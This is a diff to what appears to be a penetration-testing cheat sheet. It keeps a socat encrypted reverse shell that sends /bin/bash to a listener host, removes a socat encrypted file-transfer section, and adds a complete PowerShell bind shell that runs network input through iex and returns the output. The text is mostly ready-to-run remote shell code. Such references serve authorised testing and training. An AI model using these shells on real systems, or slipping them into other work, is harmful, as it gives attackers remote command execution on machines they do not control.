@@ -74,15 +74,6 @@ socat -d -d OPENSSL-LISTEN:<LPORT>,cert=socat.pem,verify=0,reuseaddr,fork STDOUT
 ```bash
 socat OPENSSL:<LHOST>:<LPORT>,verify=0, EXEC:/bin/bash
 ```
-## socat: encrypted file transfer
-### on machine hosting the file:
-```bash
-socat -d -d OPENSSL-LISTEN:<LPORT>,cert=socat.pem,verify=0,reuseaddr,fork file:file.txt
-```
-### on machine receiving the file:
-```bash
-socat OPENSSL:<LHOST>:<LPORT>,verify=0 file:file.txt,create
-```
 ## socat: port forwarding
 ### scenario: if web port port 8000 is only listening locally on a machine that has socat. we can bind it to the outside on port 1234 and expose it to the outside:
 ```bash
@@ -114,6 +105,26 @@ while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
 	$stream.Flush();
 }
 $client.Close();
+```
+
+## Powershell bind shell
+```
+$lport = <LPORT>
+$listener = New-Object System.Net.Sockets.TcpListener('0.0.0.0',$lport)
+$listener.start()
+$client = $listener.AcceptTcpClient()
+$stream = $client.GetStream()
+[byte[]]$bytes = 0..65535|%{0}
+while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
+    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i)
+    $sendback = (iex $data 2>&1 | Out-String )
+    $sendback2 = $sendback + 'PS ' + (pwd).Path + '> '
+    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
+    $stream.Write($sendbyte,0,$sendbyte.Length)
+    $stream.Flush()
+}
+$client.Close()
+$listener.Stop()
 ```
 
 ## Windows better tty using `rlwrap`
